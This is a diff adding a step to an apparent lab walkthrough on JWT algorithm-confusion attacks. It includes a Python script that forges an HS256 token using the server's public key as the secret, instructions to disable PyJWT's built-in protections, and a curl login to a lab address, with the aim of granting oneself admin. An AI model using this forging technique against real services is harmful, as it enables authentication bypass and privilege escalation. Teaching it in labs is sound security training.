@@ -83,5 +83,25 @@ Practical Example 5
 This is similar to example 3. Except this time, the None algorithm is not allowed.
 However, once you authenticate to the example, you will also receive the public key. As the public key isn't regarded as sensitive, it is common to find the public key.
 Sometimes, the public key is even embedded as a claim in the JWT. In this example, you must downgrade the algorithm to HS256 and then use the public key as the secret to sign the JWT.
+You can use the script provided below to assist you in forging this JWT:
 
+import jwt
 
+public_key = "ADD_KEY_HERE"
+
+payload = {
+    'username' : 'user',
+    'admin' : 0
+}
+
+access_token = jwt.encode(payload, public_key, algorithm="HS256")
+print (access_token)
+
+Before running the script, edit the file /usr/lib/python3/dist-packages/jwt/algorithms.py using your favorite text editor and go to line 143. 
+Then proceed to comment out lines 143-146 and run the script. If you are using your own VM, you may have to install Pyjwt (pip3 install pyjwt) to use this script.
+You will also need to tamper with the Pyjwt library's algorithm.py file on line 258 to remove the is_ssh_key condition as a patch for this vulnerability was released.
+Keep in mind that this placement can vary per VM and installation. 
+An easier method if you are not comfortable with library code edits is to make use of jwt.io.
+Once you verify it works, you can alter the claims to make yourself an admin and recover the flag.
+
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.10.22.190/api/v1.0/example5
